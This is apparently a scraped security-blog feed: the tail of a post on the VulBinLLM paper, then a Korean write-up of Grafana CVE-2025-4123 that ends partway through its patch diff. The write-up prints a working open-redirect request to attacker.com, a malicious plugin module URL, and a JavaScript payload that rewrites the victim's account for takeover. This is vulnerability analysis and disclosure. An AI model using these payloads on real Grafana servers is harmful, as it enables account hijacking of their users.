C">&gt;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1, <span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function">&gt;</span>{local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-keyword">for</span> (*(<span class="hljs-keyword">long</span> *)local_34 = <span class="hljs-number">0</span>; *(<span class="hljs-keyword">long</span> *)local_34 &lt; R1; local_34++) {<span class="hljs-keyword">for</span> (local_30 = <span class="hljs-number">0</span>; local_30 &lt; C2; local_30++) {(auStack_28)[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] = <span class="hljs-number">0</span>;<span class="hljs-keyword">for</span> (local_2c = <span class="hljs-number">0</span>; local_2c &lt; R2; local_2c++) {auStack_28[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] += *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">0xc</span> + param_2 + (<span class="hljs-keyword">long</span>)local_30 * <span class="hljs-number">4</span>)* *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_34 * <span class="hljs-number">8</span> + param_1 + (<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">4</span>);}}}&gt;}</code></pre></p><p><strong>[OUTPUT] Optimized Code for Vulnerability Analysis:</strong><br><pre><code class="hljs C">&gt;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> input_matrix_1, <span class="hljs-keyword">long</span> input_matrix_2)</span></span><span class="hljs-function">&gt;</span>{<span class="hljs-comment">// Initialize a matrix to store the result of matrix multiplication</span><span class="hljs-keyword">int</span> result_matrix[row_1][column_2] = {<span class="hljs-number">0</span>};<span class="hljs-comment">// Iterate over each row and column of the result matrix</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_row = <span class="hljs-number">0</span>; current_row &lt; row_1; current_row++) {<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_col = <span class="hljs-number">0</span>; current_col &lt; column_2; current_col++) {<span class="hljs-comment">// Perform matrix multiplication by iterating over the shared dimension</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> shared_dim = <span class="hljs-number">0</span>; shared_dim &lt; row_2; shared_dim++) {<span class="hljs-comment">// Vulnerability: Potential out-of-bounds access if matrix dimensions (R1, C2, R2) are not validated</span><span class="hljs-comment">// before this function call. The pointer arithmetic relies on these external constants.</span><span class="hljs-comment">// Multiply corresponding elements from the input matrices and accumulate the result.</span>result_matrix[current_row][current_col] += *((<span class="hljs-keyword">int</span> *)(input_matrix_2 + shared_dim * <span class="hljs-number">12</span> + current_col * <span class="hljs-number">4</span>)) * *((<span class="hljs-keyword">int</span> *)(input_matrix_1 + current_row * <span class="hljs-number">8</span> + shared_dim * <span class="hljs-number">4</span>));}}}&gt;}</code></pre></p><hr><p>Now, apply this process to the following Ghidra decompiled code. Provide ONLY the optimized C code as your output.</p><p><strong>[YOUR CODE TO ANALYZE GOES HERE]</strong></p></blockquote><p>This creates a prompt, complete with an example. We need to test the prompt to make sure it works, so let&#x2019;s remove the example and put it into Gemini.</p><p>Result:</p><pre><code class="hljs c"><span class="hljs-comment">/**</span><span class="hljs-comment"> * @brief Performs matrix multiplication of matrix_A (R1 x R2) and matrix_B (R2 x C2).</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * This function reconstructs the logic for matrix multiplication. It takes pointers to two</span><span class="hljs-comment"> * matrices, `matrix_A_ptr` and `matrix_B_ptr`, and computes their product. The resulting</span><span class="hljs-comment"> * (R1 x C2) matrix is stored in a local stack variable `result_matrix`.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * The dimensions R1 (rows of A), R2 (cols of A / rows of B), and C2 (cols of B)</span><span class="hljs-comment"> * are assumed to be externally defined constants (e.g., preprocessor macros),</span><span class="hljs-comment"> * which is a common source of vulnerabilities.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Based on the memory access patterns from the decompilation:</span><span class="hljs-comment"> * - matrix_A is treated as an [R1][R2] integer matrix.</span><span class="hljs-comment"> * - matrix_B is treated as an [R2][C2] integer matrix.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Note: The original stack canary check (`in_FS_OFFSET`) has been removed for clarity</span><span class="hljs-comment"> * as it is a compiler-generated security mechanism and not part of the original logic.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * @param matrix_A_ptr  Pointer to the first input matrix (assumed to be flattened R1xR2).</span><span class="hljs-comment"> * @param matrix_B_ptr  Pointer to the second input matrix (assumed to be flattened R2xC2).</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiply_matrices</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *matrix_A_ptr, <span class="hljs-keyword">int</span> *matrix_B_ptr)</span> </span>{    <span class="hljs-comment">// Vulnerability: Null Pointer Dereference</span>    <span class="hljs-comment">// The function does not check if input pointers are NULL before use. If either</span>    <span class="hljs-comment">// `matrix_A_ptr` or `matrix_B_ptr` is NULL, dereferencing them inside the loops</span>    <span class="hljs-comment">// will cause a segmentation fault and crash the application.</span>    <span class="hljs-comment">// To improve readability, we cast the flat input pointers to 2D array pointers.</span>    <span class="hljs-comment">// This mirrors the structured access intended by the original developer.</span>    <span class="hljs-comment">// The pointer arithmetic `(row * stride) + col_offset` is now `[row][col]`.</span>    <span class="hljs-comment">// The strides inferred from Ghidra (`* 8` for A, `* 0xc` for B) suggest R2=2 and C2=3.</span>    <span class="hljs-keyword">int</span> (*matrix_A)[R2] = (<span class="hljs-keyword">int</span> (*)[R2])matrix_A_ptr;    <span class="hljs-keyword">int</span> (*matrix_B)[C2] = (<span class="hljs-keyword">int</span> (*)[C2])matrix_B_ptr;    <span class="hljs-comment">// Vulnerability: Stack Buffer Overflow</span>    <span class="hljs-comment">// The result matrix is allocated on the stack with a size fixed at compile time</span>    <span class="hljs-comment">// via the macros R1 and C2. If the actual dimensions of the input matrices</span>    <span class="hljs-comment">// (determined by the caller) are larger than these compiled constants, the loops</span>    <span class="hljs-comment">// will write past the bounds of `result_matrix`, corrupting the stack.</span>    <span class="hljs-keyword">int</span> result_matrix[R1][C2];    <span class="hljs-comment">// Iterate over each row of the first matrix (matrix_A).</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_row = <span class="hljs-number">0</span>; current_row &lt; R1; current_row++) {        <span class="hljs-comment">// Iterate over each column of the second matrix (matrix_B).</span>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_col = <span class="hljs-number">0</span>; current_col &lt; C2; current_col++) {                        <span class="hljs-comment">// Initialize the target cell in the result matrix.</span>            result_matrix[current_row][current_col] = <span class="hljs-number">0</span>;            <span class="hljs-comment">// Calculate the dot product for the cell (current_row, current_col).</span>            <span class="hljs-comment">// This loop iterates over the shared dimension (columns of A and rows of B).</span>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> shared_dim = <span class="hljs-number">0</span>; shared_dim &lt; R2; shared_dim++) {                                <span class="hljs-comment">// Vulnerability: Integer Overflow</span>                <span class="hljs-comment">// The multiplication of two matrix elements can exceed the maximum value for an `int`,</span>                <span class="hljs-comment">// causing the value to wrap around (undefined behavior for signed integers).</span>                <span class="hljs-comment">// The subsequent accumulation into `result_matrix` could also overflow.</span>                                <span class="hljs-comment">// Vulnerability: Out-of-Bounds Read</span>                <span class="hljs-comment">// The loops iterate based on the external constants R1, R2, and C2. If these</span>                <span class="hljs-comment">// constants do not match the actual allocated sizes of the buffers pointed to</span>                <span class="hljs-comment">// by `matrix_A_ptr` and `matrix_B_ptr`, this operation will read from</span>                <span class="hljs-comment">// out-of-bounds memory, leading to information leakage or a crash.</span>                result_matrix[current_row][current_col] +=                    matrix_A[current_row][shared_dim] * matrix_B[shared_dim][current_col];            }        }    }    <span class="hljs-comment">// The function scope ends here. The `result_matrix` is destroyed upon returning.</span>    <span class="hljs-comment">// In a real-world scenario, its contents would likely have been copied to an</span>    <span class="hljs-comment">// output parameter pointer before the function returns.</span>}</code></pre><p>It gives more details than I thought, but anyway(?) the result looks good lol I think I can fix some details like too detailed description and using English.</p><h3 id="2-Long-term-Memory"><a href="#2-Long-term-Memory" class="headerlink" title="2) Long-term Memory"></a>2) Long-term Memory</h3><p>One of the inherent problems with LLM is the Context Window. You can&#x2019;t give us the whole programme in one go, so we have to ask you in chunks, but it&#x2019;s easy to lose context. It&#x2019;s hard to see the complex flow of how function A calls function B, and the result affects variable C.</p><p>VulBinLLM introduces the concept of &#x201C;long-term memory&#x201D; to solve this problem. The idea is to store a summary of important parts of the code (e.g. function summaries, data structures, etc.) in advance, and let LLM refer to this &#x2018;memory&#x2019; when analysing other code fragments. According to the paper, this information includes <strong>a summary of the program&#x2019;s purpose, key data structures, and function call graphs</strong>.</p><p>For example, when analysing the code above, the LLM would be presented with the following additional information</p><ul><li>Programme Summary:** &#x201C;This is a test program that accepts user input from environment variables and processes it.&#x201D;</li><li><strong>Data flow:</strong> &#x201C;The external input is stored in the <code>user_input&apos; variable via the</code>getenv&#x2019; function, which is used as a source for the `memcpy&#x2019; function.&#x201D;</li></ul><p>With this contextual information, LLM will clearly recognise that <code>user_input</code> is an &#x2018;untrusted external input&#x2019; and not just a string, and will be able to more accurately determine the vulnerability.</p><h2 id="Wrapping-up"><a href="#Wrapping-up" class="headerlink" title="Wrapping up"></a>Wrapping up</h2><p>Today, I&#x2019;ve been studying the paper &#x201C;VulBinLLM: LLM-powered Vulnerability Detection for Stripped Binaries&#x201D; and I&#x2019;ve made a quick summary of the paper, but there are a few things that I think are missing.</p><ol><li>It doesn&#x2019;t use the latest LLM model: This is a common shortcoming in many papers. I think it&#x2019;s because the development speed of the model is so fast that they design, develop, test, and then write the paper.</li><li>Is it really a novel idea&#x2026;? There are already papers on recovering stripped binary decompiled code. I&#x2019;m a bit dubious about the hacky research value of this thesis.</li></ol><p>Since there are so many LLM-related papers recently, it is not easy to pick out a really good paper and read it, so I often skim the idea. Still, if I see a paper with a good idea, I will study it again and post it lol.</p><p>Until next time&#x2026; I&#x2019;ll be back!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM/">LLM</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Security/">LLM Security</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Safety/">LLM Safety</category>
      
      <category domain="https://hackyboiz.github.io/tags/VulBinLLM/">VulBinLLM</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/15/j0ker/llm_part2/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-4123 Grafana의 Open Redirect를 통한 XSS</title>
      <link>https://hackyboiz.github.io/2025/06/14/empty/CVE-2025-4123/</link>
      <guid>https://hackyboiz.github.io/2025/06/14/empty/CVE-2025-4123/</guid>
      <pubDate>Sat, 14 Jun 2025 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nightbloodz.github.io/grafana-CVE-2025-4123</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://nightbloodz.github.io/grafana-CVE-2025-4123/">https://nightbloodz.github.io/grafana-CVE-2025-4123/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Grafana 11.6.x &lt; 11.6.2</li><li>Grafana 11.5.x &lt; 11.5.5</li><li>Grafana 11.4.x &lt; 11.4.5</li><li>Grafana 11.3.x &lt; 11.3.7</li><li>Grafana 11.2.x &lt; 11.2.10</li><li>Grafana &lt; 10.4.19</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Grafana&#xC5D0;&#xB294; &#xC815;&#xC801; &#xB9AC;&#xC18C;&#xC2A4;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xD568;&#xC218; <strong><code>staticHandler</code></strong>&#xC5D0;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xC694;&#xCCAD;&#xC5D0; &#xB530;&#xB77C; &#xD2B9;&#xC815; &#xACBD;&#xB85C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xC751;&#xB2F5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, <strong><code>opt.FileSystem.Open(file)</code></strong>&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C;&#xC77C; &#xACBD;&#xC6B0; Content&#xB97C; &#xC751;&#xB2F5;&#xD558;&#xACE0; &#xD30C;&#xC77C;&#xC774; &#xC544;&#xB2CC; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC77C; &#xACBD;&#xC6B0; &#xC778;&#xB371;&#xC2A4; &#xD30C;&#xC77C;&#xC744; &#xC751;&#xB2F5;&#xD558;&#xAE30; &#xC704;&#xD574; Redirect&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xC694;&#xCCAD; &#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC801;&#xC808;&#xD788; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC544; <strong>Open Redirect &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, &#xC774;&#xB97C; XSS&#xC640; &#xC5F0;&#xACC4;&#xD558;&#xBA74; Account Takeover</strong>&#xAE4C;&#xC9C0; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">staticHandler</span><span class="hljs-params">(ctx *web.Context, log log.Logger, opt StaticOptions)</span> <span class="hljs-title">bool</span></span> {  <span class="hljs-comment">// URL&#xC758; path &#xD30C;&#xC2F1;</span>file := ctx.Req.URL.Path  ...  <span class="hljs-comment">// path &#xD30C;&#xC77C; &#xD578;&#xB4E4; &#xC624;&#xD508;</span>f, err := opt.FileSystem.Open(file) <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>}...<span class="hljs-comment">// &#xD30C;&#xC77C; &#xC815;&#xBCF4; &#xD655;&#xC778; (&#xB514;&#xB809;&#xD1A0;&#xB9AC;, &#xD30C;&#xC77C;, &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; &#xB4F1;)</span>fi, err := f.Stat()<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>}  ...  <span class="hljs-comment">// &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC77C; &#xACBD;&#xC6B0;</span><span class="hljs-keyword">if</span> fi.IsDir() {<span class="hljs-keyword">if</span> !strings.HasSuffix(ctx.Req.URL.Path, <span class="hljs-string">&quot;/&quot;</span>) {path := fmt.Sprintf(<span class="hljs-string">&quot;%s/&quot;</span>, ctx.Req.URL.Path)<span class="hljs-keyword">if</span> !strings.HasPrefix(path, <span class="hljs-string">&quot;/&quot;</span>) {path = fmt.Sprintf(<span class="hljs-string">&quot;/%s&quot;</span>, path)} <span class="hljs-keyword">else</span> {rePrefix := regexp.MustCompile(<span class="hljs-string">`^(?:/\\|/+)`</span>)path = rePrefix.ReplaceAllString(path, <span class="hljs-string">&quot;/&quot;</span>)}<span class="hljs-comment">// Open Redirect &#xBC1C;&#xC0DD;</span>http.Redirect(ctx.Resp, ctx.Req, path, http.StatusFound)<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>}</code></pre><h3 id="Open-Redirect"><a href="#Open-Redirect" class="headerlink" title="Open Redirect"></a>Open Redirect</h3><p>Open Redirect&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xB85C;&#xC9C1; <strong><code>http.Redirect()</code></strong>&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC120; <strong><code>opt.FileSystem.Open(file)</code></strong>&#xC5D0;&#xC11C; file &#xBCC0;&#xC218;&#xC5D0; &#xB2F4;&#xAE34; &#xACBD;&#xB85C;&#xAC00; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xB0B4;&#xC5D0; &#xC874;&#xC7AC;&#xD574;&#xC57C; &#xD558;&#xBA70; <strong><code>fi.IsDir()</code></strong>&#xC870;&#xAC74;&#xBB38;&#xC5D0; &#xC9C4;&#xC785;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, <strong><code>http.Redirect()</code></strong>&#xC640; <strong><code>opt.FileSystem.Open(file)</code></strong>&#xB450; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD65C;&#xC6A9; &#xAC00;&#xB2A5;&#xD558;&#xAC8C;&#xB054; &#xC694;&#xCCAD; &#xACBD;&#xB85C;&#xB97C; &#xC870;&#xC791;&#xD558;&#xC5EC;&#xC57C; &#xD558;&#xBA70; &#xC774;&#xB54C; &#xC911;&#xC694;&#xD55C; &#xAC74; <strong><code>?</code></strong>&#xB97C; URL &#xC778;&#xCF54;&#xB529;&#xD55C; <strong><code>%3f</code></strong> &#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk">[&#xC694;&#xCCAD;]GET <span class="hljs-regexp">/public/</span>..<span class="hljs-regexp">/\attacker.com/</span>%<span class="hljs-number">3</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>.. HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">100.2</span>:<span class="hljs-number">3000</span>[&#xC751;&#xB2F5;]HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span> FoundLocation: <span class="hljs-regexp">/\attacker.com/</span>?<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../</code></pre><ul><li>opt.FileSystem.Open(file)&#xB294; &#xC704; &#xACBD;&#xB85C;&#xB97C; &#xD574;&#xC11D;&#xD560; &#xB54C;, 4&#xBC88;&#xC758; ../&#xB97C; &#xC218;&#xD589;&#xD558;&#xC5EC; &#x201C;&#x201D;&#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC5D0; &#xB530;&#xB77C; &#xCF54;&#xB4DC; &#xC0C1;&#xC5D0;&#xC11C;&#xB294; /staticfiles/etc/etc/ &#xACBD;&#xB85C;&#xC758; &#xD30C;&#xC77C; &#xD578;&#xB4E4;&#xC744; &#xC624;&#xD508;&#xD569;&#xB2C8;&#xB2E4;.</li><li>fi.IsDir()&#xC5D0;&#xC11C;&#xB294; True&#xAC00; &#xBC18;&#xD658;&#xB418;&#xBA70; if&#xBB38;&#xC73C;&#xB85C; &#xC9C4;&#xC785;&#xD569;&#xB2C8;&#xB2E4;.</li><li>http.Redirect(path)&#xB294; Location&#xC744; &#xC704;&#xD55C; &#xBB38;&#xC790;&#xC5F4; &#xCC98;&#xB9AC;&#xB97C; &#xD560; &#xB54C;, <strong><code>%3f</code></strong>&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; Path&#xC640; Raw Query&#xB85C; &#xAD6C;&#xBD84;&#xD558;&#xC5EC; &#xBD84;&#xB9AC;&#xB97C; &#xD55C; &#xB4A4; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; <strong><code>/\attacker.com/%3f/../../../../</code></strong>&#xB97C; Location &#xD5E4;&#xB354;&#xC5D0; &#xB2F4;&#xC544; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p><img src="/2025/06/14/empty/CVE-2025-4123/1.png" alt="image.png"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>Grafana&#xB294; &#xD504;&#xB860;&#xD2B8;&#xC5D4;&#xB4DC;&#xC5D0;&#xC11C; &#xD50C;&#xB7EC;&#xADF8;&#xC778; &#xC571; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xACBD;&#xB85C; <strong><code>/a/{plugin-app-name}/explore</code></strong>&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xC0C1;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xB85C; &#xC694;&#xCCAD;&#xC744; &#xD560; &#xACBD;&#xC6B0; Grafana&#xC758; &#xD504;&#xB860;&#xD2B8;&#xC5D4;&#xB4DC;&#xC758; JS&#xB294; <strong><code>{plugin-app-name}</code></strong>&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; <strong><code>/api/plugins/{pugin-app-name}/settings</code></strong>&#xB85C; <strong><code>fetch</code></strong>&#xD569;&#xB2C8;&#xB2E4;<strong>.</strong></p><p>&#xADF8; &#xB4A4;, &#x201C;module&#x201D; &#xD544;&#xB4DC;&#xC5D0; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xB294; JS&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs json">{    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;plugin-app&quot;</span>,    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;app&quot;</span>,    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-string">&quot;plugin-app&quot;</span>,    <span class="hljs-attr">&quot;enabled&quot;</span>: <span class="hljs-literal">true</span>,    <span class="hljs-attr">&quot;pinned&quot;</span>: <span class="hljs-literal">true</span>,    <span class="hljs-attr">&quot;autoEnabled&quot;</span>: <span class="hljs-literal">true</span>,    <span class="hljs-attr">&quot;module&quot;</span>: <span class="hljs-string">&quot;/modules/..../plugin-app.js&quot;</span>, <span class="hljs-comment">//js file to load</span>    <span class="hljs-attr">&quot;baseUrl&quot;</span>: <span class="hljs-string">&quot;public/plugins/grafana-lokiexplore-app&quot;</span>,    <span class="hljs-attr">&quot;info&quot;</span>: {        <span class="hljs-attr">&quot;author&quot;</span>: {            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Grafana&quot;</span>            ...        }    }    ...</code></pre><p>&#xB530;&#xB77C;&#xC11C;, Open Redirect&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xB97C; URL &#xC778;&#xCF54;&#xB529;&#xD558;&#xC5EC; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xAD6C;&#xC131;&#xD55C; &#xB4A4;, &#xC545;&#xC131; module&#xC744; &#xC751;&#xB2F5;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>/a/<strong><code>..%2f..%2f..%2fpublic%2f..%252f%255Cattacker.com%252f%253Fp%252f..%252f..%23</code></strong>/explore</li></ul><pre><code class="hljs json">{    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;ExploitPluginReq&quot;</span>,    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;app&quot;</span>,    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-string">&quot;grafana-lokiexplore-app&quot;</span>,    <span class="hljs-attr">&quot;enabled&quot;</span>: <span class="hljs-literal">true</span>,    <span class="hljs-attr">&quot;pinned&quot;</span>: <span class="hljs-literal">true</span>,    <span class="hljs-attr">&quot;autoEnabled&quot;</span>: <span class="hljs-literal">true</span>,    <span class="hljs-attr">&quot;module&quot;</span>: <span class="hljs-string">&quot;http://attacker.com/file?js=file&quot;</span>,    <span class="hljs-attr">&quot;baseUrl&quot;</span>: <span class="hljs-string">&quot;public/plugins/grafana-lokiexplore-app&quot;</span>,    <span class="hljs-attr">&quot;info&quot;</span>: {        &quot;author&quot;: {...}    }    ...}</code></pre><blockquote><p><a href="https://github.com/NightBloodz/CVE-2025-4123/blob/main/js.js">https://github.com/NightBloodz/CVE-2025-4123/blob/main/js.js</a></p></blockquote><p>module&#xC5D0;&#xC11C; <strong><code>http://attacker.com/file?js=file</code></strong> &#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA74;, &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xB294; js&#xB97C; &#xC751;&#xB2F5;&#xD558;&#xBA70; Account Takeover&#xAC00; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs json">fetch(&quot;/api/user&quot;, {  method: &quot;PUT&quot;,  headers: {    &quot;x-grafana-device-id&quot;: &quot;3b3353978aa55a04cd5b130d126adfee&quot;,    &quot;User-Agent&quot;:      &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&quot;,    Accept: &quot;application/json, text/plain, */*&quot;,    &quot;Content-Type&quot;: &quot;application/json&quot;,    &quot;x-grafana-org-id&quot;: &quot;1&quot;,    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9&quot;,    <span class="hljs-comment">// Note: &apos;Cookie&apos; headers are restricted by browsers in JavaScript fetch</span>  },  body: JSON.stringify({    name: &quot;pwned&quot;,    email: &quot;pwned@pwned.com&quot;,    login: &quot;pwned&quot;,  }),  credentials: &quot;include&quot;, // if you want cookies like grafana_session to be sent})  .then((response) =&gt; response.json())  .then((data) =&gt; console.log(data))  .catch((error) =&gt; console.error(&quot;Error:&quot;, error));alert(&quot;account pwned&quot;);</code></pre><blockquote><p><a href="https://github.com/NightBloodz/CVE-2025-4123/blob/main/js.js">https://github.com/NightBloodz/CVE-2025-4123/blob/main/js.js</a></p></blockquote><p><img src="/2025/06/14/empty/CVE-2025-4123/2.png" alt="image.png"></p><h2 id="&#xCDE8;&#xC57D;&#xC810;-&#xD328;&#xCE58;"><a href="#&#xCDE8;&#xC57D;&#xC810;-&#xD328;&#xCE58;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58;"></a>&#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58;</h2><p>Redirect&#xB97C; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC804; <strong><code>path.Clean</code></strong> &#xC744; &#xD1B5;&#xD574; <strong><code>../</code>,</strong> <code>./</code>, <strong><code>&#xC911;&#xBCF5; /</code></strong> &#xB97C; &#xC81C;&#xAC70;&#xD558;&#xC5EC; opt.FileSystem.Open&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xC815;&#xADDC;&#xD654;&#xB97C; &#xC218;&#xD589;&#xD558;&#xC5EC; &#xBD88;&#xC77C;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xD328;&#xCE58; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs go">@@ <span class="hljs-number">-159</span>,<span class="hljs-number">16</span> +<span class="hljs-number">159</span>,<span class="hljs-number">17</span> @@ <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">staticHandler</span><span class="hljs-params">(ctx *web.Context, log log.Logger, opt StaticOptions)</span> <span class="hljs-title">bool</span></span> {        <span class="hljs-keyword">if</span> fi.IsDir() {                <span class="hljs-comment">// Redirect if missing trailing slash.</span>                <span class="hljs-keyword">if</span> !strings.HasSuffix(ctx.Req.URL.Path, <span class="hljs-string">&quot;/&quot;</span>) {-                       path := fmt.Sprintf(<span class="hljs-string">&quot;%s/&quot;</span>, ctx.Req.URL.Path)-                       <span class="hljs-keyword">if</span> !strings.HasPrefix(path, <span class="hljs-string">&quot;/&quot;</span>) {+                       redirectPath := path.Clean(ctx.Req.URL.Path)+                       redirectPath = fmt.Sprintf(<span class="hljs-string">&quot;%s/&quot;</span>, redirectPath)+                       <span class="hljs-keyword">if</span> !strings.HasPrefix(redirectPath, <span class="hljs-string">&quot;/&quot;</span>) {                                <span class="hljs-comment">// Disambiguate that it&apos;s a path relative to this server</span>-                               path = fmt.Sprintf(<span class="hljs-string">&quot;/%s&quot;</span>, path)+                               redirectPath = fmt.Sprintf(<span class="hljs-string">&quot;/%s&quot;</span>, redirectPath)                        } <span class="hljs-keyword">else</span> {                                <span class="hljs-comment">// A string starting with // or /\ is interpreted by browsers as 